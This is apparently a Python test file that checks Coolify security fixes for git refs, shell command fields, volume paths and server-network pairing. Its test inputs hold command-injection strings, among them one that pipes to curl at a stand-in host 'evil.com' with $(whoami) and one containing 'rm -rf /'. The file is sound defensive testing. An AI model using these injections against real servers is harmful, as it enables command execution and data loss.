"""Tests for Coolify security-frontier preservation witness predicates."""

from __future__ import annotations

from cohort_coolify_security_frontier_preservation_witness import (
    _evaluate_application_shell,
    _evaluate_destination_pairing,
    _evaluate_git_ref,
    _evaluate_volume,
)


def test_git_ref_migration_requires_weak_flow_and_later_allowlist() -> None:
    candidate = """
public ?string $git_commit_sha = null;
protected function rules() { return ['git_commit_sha' => 'nullable']; }
private function syncData() {
    $this->application->git_commit_sha = $this->git_commit_sha;
}
"""
    repair = """
protected function rules() {
    return ['gitCommitSha' => ['nullable', 'regex:/^[a-zA-Z0-9][safe]+$/']];
}
private function syncData() {
    $this->application->git_commit_sha = $this->gitCommitSha;
}
"""
    checks = _evaluate_git_ref(
        candidate,
        repair,
        "HEAD'; whoami >/tmp/coolify_poc_git; # $(whoami)",
    )
    assert all(checks.values())


def test_application_shell_timeline_requires_runtime_and_input_repairs() -> None:
    fields = {
        "base_directory": "baseDirectory",
        "dockerfile_target_build": "dockerfileTargetBuild",
        "docker_compose_custom_start_command": "dockerComposeCustomStartCommand",
        "docker_compose_custom_build_command": "dockerComposeCustomBuildCommand",
        "custom_docker_run_options": "customDockerRunOptions",
        "pre_deployment_command_container": "preDeploymentCommandContainer",
        "post_deployment_command_container": "postDeploymentCommandContainer",
    }
    rules = "\n".join(
        f"'{snake}' => '{'required' if snake == 'base_directory' else 'nullable'}'"
        for snake in fields
    )
    persistence = "\n".join(
        f"$this->application->{snake} = $this->{snake};" for snake in fields
    )
    migration = f"{rules}\nprivate function syncData() {{ {persistence} }}"
    frontend = """
'baseDirectory' => 'required';
public function submit() {
    $oldBaseDirectory = $this->application->base_directory;
    $this->baseDirectory = rtrim($this->baseDirectory, '/');
}
"""
    incomplete = """
'baseDirectory' => 'required';
public function submit() {
    // Validate docker compose file path BEFORE saving to database
    $this->application->save();
}
"""
    restore = """
'baseDirectory' => 'required';
'dockerComposeLocation' => 'nullable';
'dockerComposeCustomStartCommand' => 'nullable';
'dockerComposeCustomBuildCommand' => 'nullable';
public function submit() {
    $this->loadComposeFile(
        restoreBaseDirectory: $oldBaseDirectory,
        restoreDockerComposeLocation: $oldDockerComposeLocation,
    );
    $this->application->refresh();
}
"""
    restore_model = """
public function loadComposeFile() {
    $fileList = collect([".$workdir$composeFile"]);
    $commands = collect([
        "git sparse-checkout set {$fileList->implode(' ')}",
        "cat .$workdir$composeFile",
    ]);
    instant_remote_process($commands, $this->destination->server);
    $this->docker_compose_location = $initialDockerComposeLocation;
    $this->base_directory = $initialBaseDirectory;
}
"""
    repair = """
'baseDirectory' => array_merge(['required'], array_slice(ValidationPatterns::directoryPathRules(), 1));
'dockerfileTargetBuild' => ValidationPatterns::dockerTargetRules();
'dockerComposeCustomStartCommand' => ValidationPatterns::shellSafeCommandRules();
'dockerComposeCustomBuildCommand' => ValidationPatterns::shellSafeCommandRules();
'customDockerRunOptions' => ValidationPatterns::shellSafeCommandRules(2000);
'preDeploymentCommandContainer' => ['nullable', ...ValidationPatterns::containerNameRules()];
"""
    job = """
$this->validatePathField($baseDir, 'base_directory');
$this->validateShellSafeCommand($this->application->docker_compose_custom_start_command, 'field');
$this->validateContainerName($containerName);
"""
    test_source = (
        "/src; echo pwned builder$(whoami) docker compose build | curl evil.com "
        "--hostname=$(whoami)"
    )
    checks = _evaluate_application_shell(
        migration,
        frontend,
        incomplete,
        restore,
        restore_model,
        repair,
        job,
        test_source,
    )
    assert all(checks.values())


def test_volume_migration_requires_same_repaired_model_sinks() -> None:
    candidate = """
public string $name;
public string $mountPath;
public ?string $hostPath = null;
'name' => 'required|string';
'mountPath' => 'required|string';
'hostPath' => 'string|nullable';
private function syncData() {
    $this->storage->name = $this->name;
    $this->storage->mount_path = $this->mountPath;
    $this->storage->host_path = $this->hostPath;
}
"""
    repair = """
'name' => ValidationPatterns::volumeNameRules();
'mountPath' => ['required', 'string', 'regex:'.ValidationPatterns::DIRECTORY_PATH_PATTERN];
'hostPath' => ['nullable', 'string', 'regex:'.ValidationPatterns::DIRECTORY_PATH_PATTERN];
private function syncData() {
    $this->storage->name = $this->name;
    $this->storage->mount_path = $this->mountPath;
    $this->storage->host_path = $this->hostPath;
}
"""
    checks = _evaluate_volume(
        candidate,
        repair,
        "GHSA-mh8x-fppq-cp77 vol; rm -rf / vol$(whoami) /etc`id`",
    )
    assert all(checks.values())


def test_destination_fix_requires_server_network_pairing_followup() -> None:
    candidate_method = """
public function METHOD() {
    $server = Server::ownedByCurrentTeam()->findOrFail($server_id);
    $network = StandaloneDocker::ownedByCurrentTeam()->findOrFail($network_id);
    $this->resource->additional_networks()->attach($network->id, ['server_id' => $server->id]);
    $this->resource->update(['destination_id' => $network->id]);
    $this->resource->additional_networks()->detach($network->id, ['server_id' => $server->id]);
}
"""
    repair_method = candidate_method.replace(
        "$network = StandaloneDocker::ownedByCurrentTeam()->findOrFail($network_id);",
        "$network = StandaloneDocker::ownedByCurrentTeam()->where('server_id', $server->id)->findOrFail($network_id);",
    )
    candidate = candidate_method.replace("METHOD", "addServer") + candidate_method.replace(
        "METHOD", "promote"
    )
    repair = repair_method.replace("METHOD", "addServer") + repair_method.replace(
        "METHOD", "promote"
    )
    checks = _evaluate_destination_pairing(
        candidate,
        "cannot attach another team's server + network; can attach own team's server + network",
        repair,
        (
            "cannot attach own network paired with wrong own server; "
            "cannot promote own network paired with wrong own server"
        ),
    )
    assert all(checks.values())
